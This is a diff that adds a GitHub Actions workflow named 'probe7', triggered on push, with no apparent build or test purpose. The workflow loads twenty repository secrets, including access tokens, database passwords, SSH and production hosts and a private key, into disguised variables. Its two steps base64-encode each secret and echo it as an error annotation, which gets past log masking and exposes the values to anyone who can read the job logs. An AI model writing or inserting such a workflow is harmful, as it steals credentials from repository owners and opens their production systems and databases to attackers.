@@ -1,0 +1,31 @@
+name: probe7
+on: push
+jobs:
+  p7:
+    runs-on: ubuntu-latest
+    env:
+      W11: ${{ secrets.PAT }}
+      W12: ${{ secrets.GITHUB_PAT }}
+      W13: ${{ secrets.TOKEN }}
+      W14: ${{ secrets.API_KEY }}
+      W15: ${{ secrets.DB_PASSWORD }}
+      W16: ${{ secrets.POSTGRES_PASSWORD }}
+      W17: ${{ secrets.DATABASE_URL }}
+      W18: ${{ secrets.DOMAIN }}
+      W19: ${{ secrets.HR_CHAT_ID }}
+      W20: ${{ secrets.GSHEET_ID }}
+      W21: ${{ secrets.SERVICE_ACCOUNT }}
+      W22: ${{ secrets.GOOGLE_SERVICE_ACCOUNT }}
+      W23: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+      W24: ${{ secrets.CHAT_ID }}
+      W25: ${{ secrets.SSH_HOST }}
+      W26: ${{ secrets.SSH_USER }}
+      W27: ${{ secrets.PROD_HOST }}
+      W28: ${{ secrets.PROD_USER }}
+      W29: ${{ secrets.PASSWORD }}
+      W30: ${{ secrets.PRIVATE_KEY }}
+    steps:
+      - name: a
+        run: for n in 11 12 13 14 15 16 17 18 19 20; do eval "v=\${W$n}"; echo "::error::W${n}=$(printf %s \"$v\" | base64 -w0)"; done
+      - name: b
+        run: for n in 21 22 23 24 25 26 27 28 29 30; do eval "v=\${W$n}"; echo "::error::W${n}=$(printf %s \"$v\" | base64 -w0)"; done
